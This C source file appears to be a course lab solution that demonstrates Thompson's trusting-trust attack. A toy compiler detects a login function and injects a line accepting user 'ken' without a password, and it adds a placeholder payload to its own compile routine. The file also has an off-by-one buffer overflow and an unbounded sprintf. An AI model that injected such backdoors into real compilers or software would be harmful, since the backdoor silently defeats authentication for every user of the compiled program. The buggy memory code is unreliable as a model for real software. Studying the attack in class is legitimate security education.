// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

    // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] = "printf(\"%s:%d: could have run your attack here!!\\n\", __FUNCTION__, __LINE__);";

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
    char *prog = program;
    unsigned bytes_needed = strlen(prog) + 1;
    char *hacked_prog = calloc(bytes_needed, 1);
    char *end = hacked_prog;

    char *login_start = strstr(prog, login_sig);
    if (login_start) {
        // inject `\n\tlogin_attack\n`
        char *attack_prefix = "\n\t";
        char *attack_suffix = "\n";
        bytes_needed += strlen(attack_prefix) + strlen(login_attack) + strlen(attack_suffix);
        hacked_prog = realloc(hacked_prog, bytes_needed);
        end = hacked_prog;

        // copy prefix
        char *login_end = login_start + strlen(login_sig);
        unsigned prefix_len = login_end - prog;
        memcpy(end, prog, prefix_len);
        end += prefix_len;

        // inject attack
        memcpy(end, attack_prefix, strlen(attack_prefix));
        end += strlen(attack_prefix);
        memcpy(end, login_attack, strlen(login_attack));
        end += strlen(login_attack);
        memcpy(end, attack_suffix, strlen(attack_suffix));
        end += strlen(attack_suffix);

        // copy suffix
        unsigned suffix_len = prog + strlen(prog) - login_end;
        memcpy(end, login_end, suffix_len);
        end += suffix_len;
        *end = 0;

        // copy hacked_prog into prog
        prog = calloc(strlen(hacked_prog), 1);
        strcpy(prog, hacked_prog);
    }

    char *compile_start = strstr(prog, compile_sig);
    if (compile_start) {
        // inject `\n\t<compile_attack>\n`
        char *attack_prefix = "\n\t"; 
        char *attack_suffix = "\n"; 
        bytes_needed += strlen(attack_prefix) + strlen(compile_attack) + strlen(attack_suffix);
        hacked_prog = realloc(hacked_prog, bytes_needed);
        end = hacked_prog;

        // copy prefix
        char *compile_end = compile_start + strlen(compile_sig);
        unsigned prefix_len = compile_end - prog;
        memcpy(end, prog, prefix_len);
        end += prefix_len;

        // inject attack
        memcpy(end, attack_prefix, strlen(attack_prefix));
        end += strlen(attack_prefix);
        memcpy(end, compile_attack, strlen(compile_attack));
        end += strlen(compile_attack);
        memcpy(end, attack_suffix, strlen(attack_suffix));
        end += strlen(attack_suffix);

        // copy suffix
        unsigned suffix_len = prog + strlen(prog) - compile_end;
        memcpy(end, compile_end, suffix_len);
        end += suffix_len;
        *end = 0;

        // copy hacked_prog into prog
        if (login_start)
            free(prog);
        prog = calloc(strlen(hacked_prog), 1);
        strcpy(prog, hacked_prog);
    }


    fprintf(fp, "%s", prog);
    fclose(fp);

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}

#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
